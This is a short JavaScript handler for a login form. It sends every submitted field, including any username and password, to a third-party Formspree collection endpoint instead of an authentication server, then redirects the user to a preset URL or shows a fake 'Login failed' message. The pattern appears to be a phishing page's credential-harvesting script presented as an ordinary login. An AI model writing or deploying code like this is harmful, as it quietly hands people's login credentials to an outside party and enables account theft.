document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();

  fetch('https://formspree.io/f/xovldppr', {
    method: 'POST',
    headers: { 'Accept': 'application/json' },
    body: new FormData(this)
  })
  .then(response => {
    if (response.ok) {
      window.location.href = this._redirect.value;
    } else {
      alert("Login failed. Please check your details.");
    }
  })
  .catch(error => {
    alert("Error connecting to server.");
  });
});
